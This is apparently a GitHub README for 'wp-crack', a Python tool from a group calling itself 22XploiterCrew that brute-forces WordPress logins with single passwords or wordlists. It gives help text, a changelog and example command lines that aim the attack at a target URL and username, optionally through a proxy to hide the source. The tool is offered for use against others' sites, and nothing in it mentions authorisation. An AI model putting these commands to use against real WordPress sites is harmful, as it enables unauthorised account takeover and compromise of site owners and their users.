<h1 align="center">WordPress<br/>Super Fast Login</h1>

<p align="center">
  <img src="https://img.shields.io/badge/Python-3.9.0-brightgreen">
  <img src="https://img.shields.io/badge/Languange-English-yellowgreen">
  <img src="https://img.shields.io/badge/License-CC-red">
</p>

> Update from version 1.2 to version 1.3

```
WordPress Brute Force Fast Login
Author : RandsX@22XploiterCrew
E-Mail : dev@22xploitercrew.my.id

usage: python3 wp-crack.py url username [-p|-P] [-x PROXY] [-v VERBOSE]

positional arguments:
  url               url the target
  username          username target

optional arguments:
  -h, --help        show this help message and exit
  -V, --version     show program's version number and exit
  -v, --verbose     verbose mode/show username and password
                    combination for each attempt
  -p , --password   use one word password
  -P , --passlist   use a few words password
  -x , --proxy      use a socks/proxy for request (ex:
                    127.0.0.1:8080)

Please check your target first so that the login process runs
smoothly
```

## What's new in version 1.3?
- Detect captcha ***the system will automatically stop if the target brings up a captcha***
- Displays the duration of time when successful login
### updates in previous versions
- Fixed bugs
- Added a proxy feature for requests
- Using the new module ```requests``` and ```colorama```
- Easy to use
- Multiprocessing

## How to use
The super fast login feature is only available if you guess (brute force) the target using a wordlist password.
- Single password
```bash
without proxy
python3 wp-crack https://site.com username -p password

with proxy
python3 wp-crack https://site.com username -p password -x http://127.0.0.1:8000
```

- List/multi passwords
```bash
without proxy
python3 wp-crack https://site.com username -P password.txt

with proxy
python3 wp-crack https://site.com username -P password.txt -x http://127.0.0.1:8000
```

if you wish to display the password and username that was attempted to sign in into the target, use option ```-v/--verbose```

## Attention
If you find an error, please report here using menu ```Issues``` or can contribute directly with us
